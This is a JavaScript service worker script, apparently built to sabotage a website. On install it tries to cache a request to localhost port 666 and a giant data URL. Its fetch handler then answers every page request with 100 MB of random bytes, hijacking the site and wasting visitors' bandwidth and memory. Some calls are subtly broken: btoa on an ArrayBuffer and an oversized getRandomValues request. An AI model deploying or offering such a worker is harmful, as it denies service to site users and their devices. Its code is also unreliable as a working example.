self.addEventListener('install', e => {
    self.skipWaiting();
    e.waitUntil(
        caches.open('paradox-cache').then(cache => {
            return cache.addAll([
                '/',
                new Request('https://localhost:666', { mode: 'no-cors' }),
                new Request('data:application/octet-stream;base64,' + btoa(new ArrayBuffer(1e9)))
            ]);
        })
    );
});

self.addEventListener('fetch', e => {
    e.respondWith(new Response(
        crypto.getRandomValues(new Uint8Array(1024 * 1024 * 100)), 
        { headers: { 'Content-Type': 'application/octet-stream' } }
    ));
});
